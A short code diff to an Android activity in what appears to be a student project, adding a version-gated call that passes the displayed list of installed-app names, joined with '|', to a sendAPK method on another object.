@@ -2,6 +2,7 @@ package com.example.proiect.View;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.AdapterView;
@@ -37,6 +38,10 @@ public class See_apps extends AppCompatActivity {
 
                     ArrayList<String> forprint = forret.get(0);
                     ArrayList<String> forlongprint =  forret.get(1);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        //Toast.makeText(getApplicationContext(), String.join("|", forprint),Toast.LENGTH_LONG).show();
+                        z.sendAPK(String.join("|", forprint));
+                    }
                     ListView g = (ListView) findViewById(R.id.listViewApps);
                     ArrayAdapter adapter = new ArrayAdapter(getApplicationContext(), android.R.layout.simple_list_item_1, forprint);
                     g.setAdapter(adapter);
